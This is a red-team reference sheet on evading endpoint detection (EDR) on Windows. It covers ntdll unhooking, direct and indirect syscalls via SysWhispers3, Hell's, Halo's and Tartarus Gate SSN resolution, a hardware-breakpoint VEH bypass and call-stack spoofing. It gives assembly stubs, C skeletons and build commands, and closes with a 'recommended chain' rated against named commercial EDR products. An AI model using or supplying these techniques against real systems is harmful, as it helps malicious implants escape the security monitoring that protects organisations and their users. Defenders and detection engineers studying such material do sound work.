# Unhook / Direct / Indirect Syscall Technique List

> Authorized red team / adversary simulation / own-product testing only. Using against unauthorized targets is forbidden.

This document summarizes current mainstream "bypass user-mode hooks" techniques, from the classic unhook to the latest hardware-breakpoint Blindside.
Every technique maps to MITRE ATT&CK T1562.001 / T1027 / T1055 for report output.

## 1. Peruns Fart / Fresh Ntdll from Disk

### Principle

EDR hooks all live in **the ntdll.dll in the current process's memory**. The on-disk `C:\Windows\System32\ntdll.dll` is clean.
So remapping the disk ntdll into the current process and overwriting the in-memory `.text` section erases the hooks.

```text
current process ntdll.dll (RWX)
  ┌─────────────────────────┐
  │ .text (with EDR hook jmp) │ ◄── overwritten with clean disk .text
  └─────────────────────────┘
        ▲
        │ NtMapViewOfSection(disk_ntdll)
        │
  disk C:\Windows\System32\ntdll.dll  ← clean
```

### Implementation Points

```c
// steps:
// 1. CreateFileW("\\Device\\HarddiskVolumeX\\Windows\\System32\\ntdll.dll")  // native path to dodge monitoring
// 2. NtCreateSection (SEC_IMAGE)
// 3. NtMapViewOfSection to a new address
// 4. find the .text section at the new address
// 5. NtProtectVirtualMemory to make the current ntdll .text RW
// 6. memcpy overwrite
// 7. NtProtectVirtualMemory to restore RX
```

### Notes

- `NtProtectVirtualMemory` itself may be hooked → chained problem. Solution: call `NtProtectVirtualMemory` via a **direct syscall** first
- Modern EDRs already monitor `NtProtectVirtualMemory` W-operations on ntdll memory; pair with an ETW patch
- Peruns Fart leaves `KERNEL_MODULE_LOAD`, `PROTECTVM` events under ETW-TI — suppress ETW first, always

## 2. Direct Syscall

### Principle

Don't call ntdll's exported functions; write your own syscall stub:

```asm
NtAllocateVirtualMemory:
    mov r10, rcx
    mov eax, 0x18      ; SSN (value on Win11 24H2; differs per version)
    syscall
    ret
```

The `syscall` instruction jumps from user mode straight to the kernel SSDT, skipping any user-mode hook.

### SysWhispers3 Usage

```powershell
git clone https://github.com/klezVirus/SysWhispers3
cd SysWhispers3
python3 syswhispers.py --preset all --action edit -o syscalls
```

Output:

```text
syscalls.h    - function declarations
syscalls.c    - C glue code
syscalls.asm  - MASM assembly stubs
syscallsstubs.std.x64.asm  - standard direct syscalls
```

In Visual Studio:

```text
1. add the .asm to the project, enable MASM (Custom Build Tool)
2. include syscalls.h
3. call Sw3NtAllocateVirtualMemory(...) in place of the original NtAllocateVirtualMemory
```

### Minimal Direct Syscall to NtCreateFile (C code skeleton)

```c
// syscalls.asm (excerpt)
// Sw3NtCreateFile PROC
//     mov [rsp +8], rcx
//     mov [rsp+16], rdx
//     mov [rsp+24], r8
//     mov [rsp+32], r9
//     sub rsp, 28h
//     mov ecx, 0x55           ; function hash (dynamically resolve the SSN)
//     call Sw3GetSyscallNumber
//     add rsp, 28h
//     mov rcx, [rsp+8]
//     mov rdx, [rsp+16]
//     mov r8,  [rsp+24]
//     mov r9,  [rsp+32]
//     mov r10, rcx
//     syscall
//     ret
// Sw3NtCreateFile ENDP

#include <windows.h>
#include "syscalls.h"

int main(void) {
    HANDLE hFile = NULL;
    OBJECT_ATTRIBUTES oa;
    UNICODE_STRING uName;
    IO_STATUS_BLOCK iosb;
    WCHAR path[] = L"\\??\\C:\\Windows\\Temp\\edr_test.bin";

    uName.Buffer = path;
    uName.Length = (USHORT)(wcslen(path) * sizeof(WCHAR));
    uName.MaximumLength = uName.Length + sizeof(WCHAR);

    InitializeObjectAttributes(&oa, &uName, OBJ_CASE_INSENSITIVE, NULL, NULL);

    NTSTATUS st = Sw3NtCreateFile(
        &hFile,
        FILE_GENERIC_WRITE,
        &oa,
        &iosb,
        NULL,
        FILE_ATTRIBUTE_NORMAL,
        0,
        FILE_OVERWRITE_IF,
        FILE_SYNCHRONOUS_IO_NONALERT,
        NULL,
        0
    );

    if (st >= 0) {
        // write some bytes (omitted)
        Sw3NtClose(hFile);
        return 0;
    }
    return (int)st;
}
```

### Downsides

- the syscall instruction lives in the implant's own `.text` section (not inside ntdll) → kernel-mode telemetry easily sees "syscall from non-ntdll address"
- this is why indirect syscalls exist

## 3. Indirect Syscall

### Principle

The syscall instruction still comes from ntdll.dll (a legitimate address); only the SSN and return address are under our control:

```text
implant code:
    mov r10, rcx
    mov eax, <SSN>
    jmp [<address of a syscall;ret gadget inside ntdll>]   ; the syscall is NOT in the implant
```

The gadget jumped to is usually the two-byte `syscall; ret` sequence at the end of an `Nt*` function.
The RIP seen by kernel-mode ETW providers is an ntdll address, matching legitimate behavior patterns.

### SysWhispers3 Indirect Mode

```powershell
python3 syswhispers.py --preset all --action edit --mode jumper -o syscalls
# --mode jumper            => indirect syscall
# --mode jumper_randomized => randomize jmp targets to reduce signatures
```

Generated stub:

```asm
Sw3NtAllocateVirtualMemory PROC
    mov [rsp+8], rcx
    ...
    mov ecx, 0x18                  ; function hash
    call Sw3GetSyscallNumber       ; returns SSN -> eax
    call Sw3GetSyscallAddress      ; returns ntdll syscall;ret address -> rbx
    ...
    mov r10, rcx
    jmp rbx                        ; jump to the legitimate syscall instruction inside ntdll
Sw3NtAllocateVirtualMemory ENDP
```

## 4. Hell's Gate / Halo's Gate / Tartarus Gate

These three are the evolution of "dynamic SSN resolution".

### Hell's Gate

- assumes ntdll is unhooked
- at implant startup, walks the ntdll `Nt*` exports and extracts the SSN from the first 4 bytes `mov eax, <SSN>`
- pros: no hardcoded SSN, works across Windows versions
- cons: if ntdll is already hooked (first byte changed to jmp), extraction fails

### Halo's Gate

- fixes Hell's Gate's hook problem
- if a function looks hooked (non-standard prologue), **scan ±N functions up/down**
- exploits the fact that `Nt*` SSNs in ntdll are consecutive and increasing; infer the hooked function's SSN from neighbors

```text
Normal:
  NtAllocateVirtualMemory  SSN = 0x18
  NtQueryInformationProcess SSN = 0x19
  NtProtectVirtualMemory    SSN = 0x50

If NtAllocateVirtualMemory is hooked and its SSN is invisible, look at neighbors:
  previous unhooked export SSN = 0x17
  next unhooked export SSN = 0x19
  → NtAllocateVirtualMemory SSN = 0x18
```

### Tartarus Gate

- additionally handles advanced hooks that **changed the SSN but kept the syscall instruction**
- validates both the SSN and the syscall;ret gadget address
- combining all three gives the most stable indirect syscall base

### Reference implementations (after bootstrapping via git clone)

```text
Hell's Gate:    am0nsec/HellsGate
Halo's Gate:    am0nsec/HellsGate (with fallback logic) / SafeBreach-Labs/HalosGate-PoC
Tartarus Gate:  trickster0/TartarusGate
SysWhispers3:   integrates all three
```

## 5. Hardware Breakpoint Blindside

### Principle

Use debug registers `DR0-DR3` to set hardware breakpoints at the EDR hook trampoline entries;
install a VEH (Vectored Exception Handler) that, on breakpoint hit, points RIP **directly past the hook trampoline**,
skipping EDR's detection code and landing in ntdll's real syscall section.

### Advantages

- no writes to ntdll memory (no `NtProtectVirtualMemory` alert)
- no unhooking needed (the hook stays, just bypassed)
- ETW-TI sees no memory modification

### Implementation Skeleton

```c
// 1. AddVectoredExceptionHandler
// 2. set DR0..DR3 at each hooked function entry (max 4, combine with single-step rotation)
// 3. SetThreadContext(thread, &ctx) to write DRx
// 4. when the EDR hook trampoline triggers the hardware breakpoint -> VEH takes over
// 5. VEH points EXCEPTION_POINTERS->ContextRecord->Rip to ntdll's legitimate syscall;ret
// 6. ContinueExecution

LONG CALLBACK Blindside(EXCEPTION_POINTERS* ep) {
    if (ep->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) {
        DWORD64 rip = ep->ContextRecord->Rip;
        if (rip == g_hookedNtAllocVM) {
            // SSN already in eax; R10 = RCX; jump to ntdll's syscall;ret
            ep->ContextRecord->Rip = (DWORD64)g_syscallGadget;
            return EXCEPTION_CONTINUE_EXECUTION;
        }
    }
    return EXCEPTION_CONTINUE_SEARCH;
}
```

### Limitations

- DRx is per-thread → must be set per thread in multithreaded cases
- some EDRs already hook `NtSetContextThread` / `NtGetContextThread`; bypass them with the earlier techniques first
- Win11 22H2+ HVCI / some anti-debug mitigations may interfere

## 6. Call Stack Spoofing

### The Problem

Modern EDRs call `RtlCaptureStackBackTrace` at kernel entries of syscalls like `NtAllocateVirtualMemory` / `NtCreateThreadEx`,
and report the full call stack. The implant's stack shows **non-image-backed memory** frames → high-confidence alert.

### Option A: CallStackSpoofer (William Burgess)

Implementation idea:

1. swap the current thread's stack before the syscall → a forged legitimate stack
2. fill the forged frames with a fully legitimate return chain like `kernel32!BaseThreadInitThunk → ntdll!RtlUserThreadStart`
3. swap back to the real stack after the syscall returns

### Option B: SilentMoonwalk

More aggressive, uses a desynchronized stack:

```text
Execution flow:
  implant code  →  custom trampoline (modifies RSP / RBP / stack content)
                ↓
                syscall (RtlCaptureStackBackTrace sees the forged stack)
                ↓
                trampoline restores → continue implant code
```

The key is unwinding: make `RtlVirtualUnwind` walk into the forged `RUNTIME_FUNCTION` / `UNWIND_INFO` chain.

### Practical OPSEC Advice

- call stack spoof + indirect syscall + ETW patch is currently a fairly reliable combo against CrowdStrike / SentinelOne
- spoof during sleep too; spoofing only at execution time is not enough (EDRs sample periodically)

## 7. Technique Selection Comparison Table

| Technique | Counters | Complexity | Current effectiveness | ATT&CK |
|------|------|--------|------------|--------|
| Peruns Fart | user-mode hooks | Low | Medium (easily caught by ETW) | T1562.001 |
| Direct syscall (SysWhispers) | user-mode hooks | Low | Low-Medium (kernel sees RIP in implant) | T1106 / T1562.001 |
| Indirect syscall (jumper) | user-mode hooks + kernel RIP detection | Medium | Medium-High | T1106 |
| Hell's / Halo's / Tartarus | SSN resolution | Medium | High (infrastructure) | T1027 |
| HWBP Blindside | hooks + no writes | High | High | T1562.001 |
| CallStackSpoofer / SilentMoonwalk | call stack telemetry | High | High | T1564 |

Practical recommended chain: **Halo's Gate + indirect syscall + CallStackSpoofer + ETW patch**.

## References

- SysWhispers3: <https://github.com/klezVirus/SysWhispers3>
- Hell's Gate / Halo's Gate POC: <https://github.com/am0nsec/HellsGate>, <https://github.com/SafeBreach-Labs/HalosGate-PoC>
- Tartarus Gate: <https://github.com/trickster0/TartarusGate>
- CallStackSpoofer: <https://github.com/WithSecureLabs/CallStackSpoofer>
- SilentMoonwalk: <https://github.com/klezVirus/SilentMoonwalk>
- Blindside (hardware breakpoint): <https://www.cyberark.com/resources/threat-research-blog/blindside-a-new-technique-for-edr-evasion-with-hardware-breakpoints>
- MITRE T1562.001: <https://attack.mitre.org/techniques/T1562/001/>

## Routing Callback

Unhooking is only half the bypass; the other half is telemetry blindness: go to `telemetry-blinding.md`.

